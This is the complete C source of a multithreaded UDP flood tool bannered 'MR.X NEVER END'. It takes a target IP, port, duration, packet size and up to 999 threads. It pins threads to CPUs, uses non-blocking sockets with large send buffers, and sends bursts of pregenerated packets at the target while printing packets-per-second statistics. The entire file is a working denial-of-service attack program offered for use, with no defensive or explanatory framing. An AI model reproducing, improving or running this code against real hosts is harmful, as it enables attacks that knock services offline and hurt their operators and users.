#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int ready_signal = 0;
_Atomic int stop_signal = 0;

#define PREGEN_COUNT 256
#define MAX_PACKET_SIZE 1024
char *pregen_buffers[PREGEN_COUNT];
struct sockaddr_in target_addr;

typedef struct {
    uint32_t timestamp;
    uint16_t packet_id;
    uint8_t packet_type;
    uint8_t flags;
    uint32_t sequence;
    uint16_t checksum;
} udp_header_t;

void lock_cpu(int thread_id) {
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    int cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpu_count > 0) {
        CPU_SET(thread_id % cpu_count, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
}

uint32_t fast_rand(uint64_t *state) {
    *state = (*state * 1103515245 + 12345) & 0x7FFFFFFF;
    return (uint32_t)*state;
}

void init_pregen_buffers() {
    for (int i = 0; i < PREGEN_COUNT; i++) {
        pregen_buffers[i] = malloc(PACKET_SIZE);
        if (!pregen_buffers[i]) exit(1);
        
        udp_header_t *hdr = (udp_header_t *)pregen_buffers[i];
        hdr->packet_type = 0xA1 + (i % 16);
        hdr->flags = 0xC3 ^ (i & 0xFF);
        
        uint32_t pattern = i * 0x9E3779B9;
        for (int j = sizeof(udp_header_t); j < PACKET_SIZE; j++) {
            pregen_buffers[i][j] = (char)((pattern + j) & 0xFF);
            pattern = (pattern << 3) | (pattern >> 29);
        }
    }
}

void cleanup_pregen_buffers() {
    for (int i = 0; i < PREGEN_COUNT; i++) {
        if (pregen_buffers[i]) free(pregen_buffers[i]);
    }
}

int create_optimized_socket() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) return -1;
    
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    
    int sndbuf = 2 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 600;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    
    return sockfd;
}

void *attack_thread(void *arg) {
    int thread_id = *(int *)arg;
    lock_cpu(thread_id);
    
    int sockfd = create_optimized_socket();
    if (sockfd < 0) pthread_exit(NULL);
    
    char warmup_packet[MAX_PACKET_SIZE];
    memset(warmup_packet, 0xFF, PACKET_SIZE);
    for (int i = 0; i < 20; i++) {
        sendto(sockfd, warmup_packet, PACKET_SIZE, MSG_DONTWAIT,
              (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (i % 5 == 0) usleep(500);
    }
    
    char prewarm_packet[MAX_PACKET_SIZE];
    memset(prewarm_packet, 0xAA, PACKET_SIZE);
    for (int i = 0; i < 10; i++) {
        sendto(sockfd, prewarm_packet, PACKET_SIZE, MSG_DONTWAIT,
              (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(100);
    }
    
    char keepalive_packet[MAX_PACKET_SIZE];
    memset(keepalive_packet, 0xCC, PACKET_SIZE);
    
    while (!ready_signal) {
        sendto(sockfd, keepalive_packet, PACKET_SIZE, MSG_DONTWAIT,
              (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(200);
    }
    
    time_t start_time = time(NULL);
    int packet_index = (thread_id * 17) % PREGEN_COUNT;
    uint64_t rand_state = (time(NULL) << 16) + thread_id * 0x9E3779B9;
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    
    while (!stop_signal) {
        if (time(NULL) - start_time >= ATTACK_TIME) break;
        
        pthread_testcancel();
        
        int elapsed = time(NULL) - start_time;
        int burst_size = 28 - (PACKET_SIZE / 64);
        if (burst_size < 12) burst_size = 12;
        if (burst_size > 28) burst_size = 28;
        
        if (elapsed > 240) burst_size -= 2;
        
        for (int i = 0; i < burst_size; i++) {
            if (!pregen_buffers[packet_index]) {
                char temp_packet[MAX_PACKET_SIZE];
                uint32_t rand_val = fast_rand(&rand_state);
                for (int j = 0; j < PACKET_SIZE; j++) {
                    temp_packet[j] = (char)((rand_val + j) & 0xFF);
                    rand_val = (rand_val << 2) | (rand_val >> 30);
                }
                
                sendto(sockfd, temp_packet, PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr *)&target_addr, sizeof(target_addr));
            } else {
                char thread_local_packet[MAX_PACKET_SIZE];
                memcpy(thread_local_packet, pregen_buffers[packet_index], PACKET_SIZE);
                
                udp_header_t *hdr = (udp_header_t *)thread_local_packet;
                hdr->timestamp = (uint32_t)time(NULL);
                hdr->packet_id = thread_id;
                hdr->sequence = local_packets;
                hdr->checksum = (hdr->timestamp ^ hdr->sequence ^ thread_id ^ 0x9E37) & 0xFFFF;
                
                sendto(sockfd, thread_local_packet, PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr *)&target_addr, sizeof(target_addr));
            }
            
            local_packets++;
            packet_index = (packet_index + 1) % PREGEN_COUNT;
            
            pthread_testcancel();
        }
        
        local_bytes += burst_size * PACKET_SIZE;
        
        int delay_us = 600 + (PACKET_SIZE / 3);
        if (delay_us < 600) delay_us = 600;
        if (delay_us > 1300) delay_us = 1300;
        
        usleep(delay_us);
        
        if (local_packets >= 2000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        pthread_testcancel();
    }
    
    atomic_fetch_add(&total_packets, local_packets);
    atomic_fetch_add(&total_bytes, local_bytes);
    
    close(sockfd);
    pthread_exit(NULL);
}

void *stats_monitor(void *arg) {
    sleep(2);
    
    unsigned long long prev_packets = 0;
    
    for (int second = 1; second <= ATTACK_TIME && !stop_signal; second++) {
        sleep(1);
        
        unsigned long long current_packets = atomic_load(&total_packets);
        unsigned long long pps = current_packets - prev_packets;
        prev_packets = current_packets;
        
        unsigned long long current_peak = atomic_load(&peak_pps);
        if (pps > current_peak) atomic_store(&peak_pps, pps);
        
        printf("[%03ds] PPS: %5lluK | Peak: %5lluK\n", 
               second, pps / 1000, atomic_load(&peak_pps) / 1000);
        fflush(stdout);
    }
    
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    printf("🚀 MR.X NEVER END 🚀\n\n");
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || ATTACK_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        printf("Invalid parameters\n");
        return 1;
    }
    
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (PACKET_SIZE < 10) PACKET_SIZE = 10;
    if (THREAD_COUNT > 999) THREAD_COUNT = 999;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    if (target_addr.sin_addr.s_addr == INADDR_NONE) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n\n", PACKET_SIZE, THREAD_COUNT);
    
    init_pregen_buffers();
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *thread_ids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !thread_ids) {
        printf("Memory allocation failed\n");
        return 1;
    }
    
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL);
    
    int threads_created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]) == 0) {
            threads_created++;
        }
        
        if (i % 35 == 0 && i > 0) usleep(8000);
    }
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    sleep(1);
    ready_signal = 1;
    
    sleep(ATTACK_TIME);
    stop_signal = 1;
    
    for (int i = 0; i < threads_created; i++) {
        pthread_cancel(threads[i]);
    }
    
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    unsigned long long final_packets = atomic_load(&total_packets);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_peak = atomic_load(&peak_pps);
    
    printf("\nAttack complete\n");
    printf("Total packets: %llu\n", final_packets);
    printf("Total data: %.2f MB\n", final_bytes / (1024.0 * 1024.0));
    printf("Peak PPS: %lluK\n", final_peak / 1000);
    
    cleanup_pregen_buffers();
    free(threads);
    free(thread_ids);
    
    return 0;
}